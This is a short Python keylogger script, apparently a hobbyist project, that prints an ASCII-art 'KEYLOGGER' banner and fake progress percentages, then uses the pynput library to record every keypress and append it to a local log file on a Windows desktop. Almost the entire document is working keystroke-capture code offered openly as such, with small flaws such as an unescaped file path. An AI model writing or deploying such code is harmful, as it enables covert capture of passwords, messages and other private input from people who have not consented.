print('        ||  ||   |||||| |||     ||| |||     |||||||| |||||||| ||||||||'),
print('        ||||||   |||      ||| |||   |||     ||    || ||    || ||    ||'),
print('        |||      |||        |||     |||     ||    || ||    || ||     '),
print('        || ||    ||||||     |||     |||     ||    || ||    || || ||||||'),
print('        ||  ||   |||        |||     |||     ||    || ||    || ||    ||'),
print('        ||   ||  ||||||     |||     ||||||| |||||||| |||||||| |||||||| '),
print(' 01%'),
print(' 02%'),
print(' 03%'),
print(' 04%'),
print(' 05%'),
print(' conplete...................%'),

from pynput.keyboard import Listener
import re

arquivoLog = "C:\Users\HENBOX\Desktop\Projetos\KEYLOOGER.log"

def capturar(tecla):
    tecla = str(tecla)
    print(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'key.space', ' ', tecla)
    tecla = re.sub(r'key.enter', '\n', tecla)
    tecla = re.sub(r'key.*', ' ', tecla)

    with open(arquivoLog, "a") as log:
        log.write(tecla)
    

with Listener(on_press=capturar) as l:
    l.join()